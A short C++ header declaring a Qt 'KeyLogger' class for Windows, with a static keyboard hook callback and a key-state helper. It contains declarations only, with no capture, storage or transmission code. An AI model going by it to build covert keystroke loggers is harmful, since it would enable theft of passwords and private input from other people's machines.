#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QDebug>
#include <QObject>
#include <QString>

#include <windows.h>

class KeyLogger :
    public QObject
{
    Q_OBJECT

public:
    explicit KeyLogger(QObject *parent = nullptr);

    static void updateKeyState(BYTE *keyState, int keyCode);
    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

#endif // KEYLOGGER_H
